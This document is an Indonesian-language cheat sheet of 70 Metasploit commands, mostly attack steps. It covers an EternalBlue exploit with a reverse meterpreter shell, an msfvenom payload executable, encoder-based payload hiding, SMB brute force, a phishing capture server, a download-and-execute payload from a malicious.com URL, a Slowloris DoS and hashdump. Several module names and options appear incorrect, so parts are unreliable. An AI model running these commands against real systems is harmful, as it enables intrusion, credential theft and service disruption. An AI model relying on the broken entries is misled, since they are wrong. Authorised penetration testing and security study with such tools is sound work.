Metasploit

Pengenalan

Metasploit adalah framework pengujian penetrasi yang digunakan untuk mengembangkan dan mengeksekusi eksploitasi terhadap sistem yang rentan. Ini sangat berguna untuk pengujian keamanan dan penelitian.

70 Contoh Penggunaan

1. Memulai Metasploit

msfconsole

2. Melihat semua modul eksploit

search type:exploit

3. Memilih modul eksploit

use exploit/windows/smb/ms17_010_eternalblue

4. Melihat opsi modul eksploit

show options

5. Mengatur target IP

set RHOSTS 192.168.1.1

6. Mengatur port target

set RPORT 445

7. Mengatur payload yang akan digunakan

set PAYLOAD windows/x64/meterpreter/reverse_tcp

8. Mengatur alamat IP untuk koneksi balik

set LHOST 192.168.1.2

9. Menjalankan eksploit

exploit

10. Melihat semua payload yang tersedia

show payloads

11. Menjalankan sesi meterpreter

sessions -i 1

12. Menampilkan informasi tentang sesi

info

13. Mengambil screenshot dari sesi meterpreter

screenshot

14. Mengambil file dari target

download /path/to/file

15. Mengunggah file ke target

upload /path/to/local/file /path/to/target/file

16. Melihat informasi sistem target

sysinfo

17. Menjalankan perintah shell pada target

shell

18. Mencetak daftar pengguna pada sistem target

net user

19. Menjalankan perintah di background

run -j

20. Menghentikan sesi yang berjalan

exit

21. Menggunakan auxiliary untuk pemindaian

use auxiliary/scanner/portscan/tcp

22. Menjalankan pemindaian port

run

23. Mengatur timeout untuk koneksi

set TIMEOUT 5

24. Mencetak semua modul yang tersedia

show all

25. Mengatur payload untuk mengirimkan reverse shell

set PAYLOAD cmd/unix/reverse

26. Mengatur opsi brute force

use auxiliary/scanner/smb/smb_login

27. Mengatur file password untuk brute force

set PASS_FILE /path/to/password/file

28. Mengatur user untuk brute force

set USER_FILE /path/to/user/file

29. Menjalankan pemindaian brute force

run

30. Menggunakan meterpreter untuk mengeksekusi perintah

execute -f /path/to/program

31. Menampilkan semua sesi yang aktif

sessions

32. Mengatur payload untuk aplikasi web

set PAYLOAD php/meterpreter/reverse_tcp

33. Melihat semua modul eksploitas yang dapat digunakan untuk aplikasi web

search web

34. Menggunakan Metasploit untuk serangan SQL Injection

use auxiliary/scanner/sql/sqlmap

35. Mengatur URL target untuk serangan SQL Injection

set TARGET_URL http://example.com/vulnerable.php?id=1

36. Menjalankan serangan SQL Injection

run

37. Menyimpan hasil eksploit ke file

set OUTPUT_FILE /path/to/output/file

38. Menggunakan Post-Exploitation untuk pengumpulan informasi

use post/multi/gather/enum_system

39. Menjalankan pengumpulan informasi setelah eksploitasi

run

40. Menggunakan modul untuk bypass antivirus

use exploit/windows/fileformat/exe

41. Menggunakan Metasploit untuk mengatur serangan phishing

use auxiliary/server/capture/http

42. Mengatur URL untuk serangan phishing

set URIPATH /phishing

43. Menjalankan server phishing

run

44. Mengatur payload untuk aplikasi mobile

set PAYLOAD android/meterpreter/reverse_tcp

45. Menjalankan serangan terhadap aplikasi mobile

run

46. Mencetak laporan sesi

report -t html -o /path/to/report.html

47. Mengatur antarmuka pengguna (UI) untuk Metasploit

msfconsole -r /path/to/script.rc

48. Menggunakan msfvenom untuk membuat payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > payload.exe

49. Menjalankan payload yang dibuat

./payload.exe

50. Menggunakan Metasploit untuk pemindaian kerentanan

use auxiliary/scanner/vuln/ms17_010_eternalblue

51. Mengatur target IP untuk pemindaian kerentanan

set RHOSTS 192.168.1.1

52. Menjalankan pemindaian kerentanan

run

53. Menggunakan Metasploit untuk eksploitasi web

use exploit/unix/webapp/wordpress_sqli

54. Mengatur URL target untuk eksploitasi web

set TARGET_URL http://example.com/wp-admin/admin.php

55. Menjalankan eksploitasi web

run

56. Menampilkan hasil log sesi

log

57. Mengatur shell ke command shell

shell

58. Menggunakan Metasploit untuk mengelola sesi

sessions -l

59. Mengubah ke sesi lain

sessions -i

60. Menggunakan encoder untuk menyembunyikan payload

set ENCODER x86/shikata_ga_nai

61. Menggunakan Metasploit untuk membongkar password

use auxiliary/gather/enum_users

62. Mengatur payload untuk mengunduh malware

set PAYLOAD windows/download_exec

63. Mengatur URL untuk unduhan malware

set DOWNLOAD_URL http://malicious.com/malware.exe

64. Menjalankan unduhan malware

run

65. Menggunakan Metasploit untuk serangan DoS

use auxiliary/dos/http/slowloris

66. Mengatur target untuk serangan DoS

set RHOST 192.168.1.1

67. Menjalankan serangan DoS

run

68. Mencetak semua informasi yang terkumpul dari sesi

hashdump

69. Menjalankan pengumpulan informasi jaringan

run post/windows/gather/enum_network

70. Menghentikan semua sesi

sessions -K

Catatan Penting

- Gunakan Metasploit secara etis dan legal; selalu dapatkan izin sebelum melakukan pengujian keamanan.
- Banyak modul dan eksploit dapat berisiko; pastikan untuk memahami konsekuensi sebelum menjalankannya.
- Perbarui Metasploit secara teratur untuk mendapatkan modul dan eksploit terbaru.
